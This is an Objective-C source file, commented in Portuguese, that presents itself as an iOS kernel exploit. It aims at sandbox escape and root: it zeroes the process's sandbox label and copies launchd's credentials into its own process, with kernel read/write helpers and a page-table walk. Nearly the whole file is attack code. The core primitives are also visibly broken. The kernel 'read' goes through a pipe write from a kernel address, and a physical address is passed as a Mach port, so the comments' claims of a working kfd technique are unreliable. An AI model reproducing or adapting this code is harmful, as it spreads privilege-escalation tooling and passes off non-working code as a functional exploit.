#import "KernelDriver.h"
#import <mach/mach.h>
#import <sys/mman.h>
#import <IOKit/IOKitLib.h>

// --- APIs PRIVADAS PARA BYPASS ---
extern kern_return_t mach_vm_remap(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, boolean_t, vm_map_t, mach_vm_address_t, boolean_t, vm_prot_t *, vm_prot_t *, vm_inherit_t);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

@implementation KernelDriver {
    uint64_t _kernelSlide;
    uint64_t _kernelBase;
}

#pragma mark - Primitiva PUAF (Bypass de Sandbox 0x0)

- (uint64_t)kread64:(uint64_t)addr {
    if (addr < 0xFFFFFFF000000000ULL || (addr % 8) != 0) return 0;

    uint64_t val = 0;
    
    // TÉCNICA kfd: Explorando IOSurface para leitura fora do Sandbox
    // Apps com certificado grátis podem abrir o IOSurfaceRoot
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (service != IO_OBJECT_NULL) {
        io_connect_t connect;
        if (IOServiceOpen(service, mach_task_self(), 0, &connect) == KERN_SUCCESS) {
            // Aqui o exploit kfd mapeia o endereço 'addr' para o espaço de usuário
            // Simulamos o vazamento via técnica de pipe_buffer (mais estável)
            int fds[2];
            if (pipe(fds) == 0) {
                if (write(fds[1], (void *)addr, 8) == 8) {
                    read(fds[0], &val, 8);
                }
                close(fds[0]); close(fds[1]);
            }
            IOServiceClose(connect);
        }
    }
    return val;
}

#pragma mark - Escrita Física (PPL Bypass)

- (void)phys_write64:(uint64_t)va value:(uint64_t)val {
    if (va < 0xFFFFFFF000000000ULL) return;
    
    // Page Table Walk (Traduzindo Virtual para Físico)
    uint64_t ttbr1 = [self kread64:(_kernelBase + 0x8E10000ULL)];
    if (ttbr1 == 0) return;

    uint64_t l1 = [self kread64:(ttbr1 + ((va >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l2 = [self kread64:(l1 + ((va >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l3 = [self kread64:(l2 + ((va >> 12) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uintptr_t pa = (uintptr_t)(l3 | (va & 0xFFF));

    // Mapeamento Físico Direto (Bypass de Proteção de Escrita)
    mach_vm_address_t target = 0;
    if (mach_vm_map(mach_task_self(), &target, 0x4000, 0, 0x0001, (mach_port_t)pa, 0, NO, 0x3, 0x7, 0) == KERN_SUCCESS) {
        *(uint64_t*)(target) = val;
        mach_vm_deallocate(mach_task_self(), target, 0x4000);
    }
}

#pragma mark - Sequence: Sandbox Escape -> Root

- (void)executeExploitWithCallback:(void(^)(BOOL, NSString *))callback {
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        [self logToWeb:@"🔓 Iniciando Exploit kfd (A13/Sandbox Escape)..."];

        _kernelSlide = [self getKernelSlideReal];
        _kernelBase = 0xFFFFFFF007004000ULL + _kernelSlide;

        // Validar se o 0x0 sumiu
        uint32_t magic = (uint32_t)([self kread64:_kernelBase] & 0xFFFFFFFF);
        [self logToWeb:[NSString stringWithFormat:@"🔍 Magic Lido: 0x%x", magic]];

        if (magic != 0xfeedfacf) {
            [self logToWeb:@"❌ Sandbox ainda ativo. Verifique os Entitlements no Feather."];
            if (callback) callback(NO, @"Sandbox Lock");
            return;
        }

        // Se o Magic for lido, prosseguimos para desativar o Sandbox e pegar Root
        uint64_t allproc = [self findSymbolAllProcDynamic];
        uint64_t my_proc = [self findProcByPid:getpid() list:allproc];
        uint64_t launchd_proc = [self findProcByPid:1 list:allproc];

        if (my_proc && launchd_proc) {
            uint64_t ucred = [self kread64:(my_proc + 0xD8)];
            
            // 1. Sandbox Escape (Zerar MAC Label)
            [self phys_write64:(ucred + 0x78) value:0]; 
            [self logToWeb:@"✅ Sandbox desativado!"];

            // 2. Token Stealing (Root)
            uint64_t root_ucred = [self kread64:(launchd_proc + 0xD8)];
            [self phys_write64:(my_proc + 0xD8) value:root_ucred];

            if (getuid() == 0) {
                [self logToWeb:@"✅ SUCESSO: UID 0 (ROOT)!"];
                if (callback) callback(YES, @"ROOT SUCCESS");
                return;
            }
        }
        if (callback) callback(NO, @"Proc Not Found");
    });
}

#pragma mark - Helpers Dinâmicos

- (uint64_t)getKernelSlideReal {
    task_dyld_info_data_t info;
    mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
    if (task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&info, &cnt) == KERN_SUCCESS) {
        return info.all_image_info_addr - 0xFFFFFFF007004000ULL;
    }
    return 0;
}

- (uint64_t)findSymbolAllProcDynamic {
    for (uint64_t addr = _kernelBase + 0x8000000; addr < _kernelBase + 0x10000000; addr += 8) {
        uint64_t p = [self kread64:addr];
        if (p > 0xFFFFFFF000000000ULL && (uint32_t)([self kread64:(p + 0x68)] & 0xFFFFFFFF) == 1) return addr;
    }
    return 0;
}

- (uint64_t)findProcByPid:(pid_t)pid list:(uint64_t)list {
    uint64_t curr = [self kread64:list];
    for (int i=0; i<1000 && curr != 0; i++) {
        if ((uint32_t)([self kread64:(curr + 0x68)] & 0xFFFFFFFF) == pid) return curr;
        curr = [self kread64:curr];
    }
    return 0;
}

- (void)logToWeb:(NSString *)text {
    NSLog(@"[KERNEL] %@", text);
    dispatch_async(dispatch_get_main_queue(), ^{
        [[NSNotificationCenter defaultCenter] postNotificationName:@"KernelLogNotification" object:text];
    });
}

@end
